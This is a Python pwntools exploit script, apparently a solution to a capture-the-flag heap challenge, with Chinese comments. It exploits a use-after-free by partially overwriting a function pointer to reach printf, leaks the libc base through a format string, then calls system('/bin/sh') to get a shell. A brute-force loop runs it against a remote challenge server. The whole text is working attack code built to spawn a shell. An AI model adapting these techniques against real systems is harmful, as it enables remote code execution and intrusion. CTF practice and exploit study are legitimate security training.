#coding:utf8
#需要爆破4bit
from pwn import *
 
# context.log_level = 'debug'
libc = ELF('./libc-2.23.so')
 
def add(size,content):
   sh.sendlineafter('3.quit','create ')
   sh.sendlineafter('size:',str(size + 1))
   sh.sendafter('str:',content + '\x00')
 
def delete(index):
   sh.sendlineafter('3.quit','delete ')
   sh.sendlineafter('id:',str(index))
   sh.sendlineafter('Are you sure?:','yes')
 
def exploit():
   add(0x10,'a'*0x10) #0
   add(0x10,'b'*0x10) #1
   delete(1)
   delete(0)
   #低字节覆盖为printf
   add(0x20,'%22$p'.ljust(0x18,'b') + p16(0x59D0)) #0
   delete(1)
   sh.recvuntil('0x')
   libc_base = int(sh.recvuntil('b',drop = True),16) - libc.symbols['_IO_2_1_stdout_']
   system_addr = libc_base + libc.sym['system']
   print ('libc_base=' + hex(libc_base))
   print ('system_addr=' + hex(system_addr))
   add(0x10,'a'*0x10) #1
   add(0x10,'b'*0x10) #2
   delete(2)
   delete(1)
   add(0x20,'/bin/sh;'.ljust(0x18,'a') + p64(system_addr))
   #getshell
   delete(2)
 
while True:
   try:
      global sh
      #sh = process('./pwn-f')
      sh = remote('node4.buuoj.cn',26733)
      exploit()
      sh.interactive()
   except:
      sh.close()
      print ('trying...')
 
sh.interactive()
